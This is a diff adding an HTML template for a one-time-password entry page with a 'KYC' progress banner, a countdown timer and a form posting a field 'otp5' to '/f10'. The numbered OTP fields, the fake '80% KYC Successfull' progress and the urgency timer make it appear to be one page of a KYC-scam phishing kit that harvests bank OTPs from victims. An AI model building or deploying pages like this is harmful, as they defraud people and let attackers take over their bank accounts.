@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" th:href="@{/css/page4.css}" />
+    <title>Welcome</title>
+  </head>
+  <body>
+    <div class="content">
+      <div class="logo">
+        <img th:src="@{/images/afx.png}" alt="logo" />
+      </div>
+
+      <div class="second">
+        <p>Enter the One Time Password sent to your mobile phone</p>
+      </div>
+
+      <div class="danger">
+        <h3>Invalidate One Time Password</h3>
+        <p>Automatically resend new OTP on your registered mobile.</p>
+      </div>
+    <div class="form">
+        <form th:action="@{/f10}" th:object="${customer}" method="post">
+          <label for="otp">Enter the One Time Password</label>
+          <input type="text" id="otp5" name="otp5" required/><br /><br />
+          <div class="green">
+            <p>80% KYC Successfull</p>
+          </div>
+          <input class="btn" type="submit" value="SUBMIT" />
+        </form>
+      </div>
+    </div>
+
+    <!-- Add this code to the HTML page where you want to display the timer -->
+<div id="timer">03:00</div>
+<script>
+  var count = 180;
+  var timer = setInterval(function() {
+    count--;
+    var seconds = count % 60;
+    var minutes = Math.floor(count / 60);
+    document.getElementById("timer").innerHTML = 
+      (minutes < 10 ? "0" + minutes : minutes) + ":" + 
+      (seconds < 10 ? "0" + seconds : seconds);
+    if (count == 0) {
+      clearInterval(timer);
+      alert("Time's up!");
+      // You can add code here to redirect to another page or perform other actions
+    }
+  }, 1000);
+</script>
+
+<div class="last">
+    <p>If you did not receive the One Time Password on SMS, you can <span>Click here to resend the OTP</span></p>
+</div>
+
+    <div class="footer">
+        <p>&copy; Copyright</p>
+        <p>Terms and Conditions</p>
+        <p>Privacy Policy</p>
+    </div>
+  </body>
+</html>
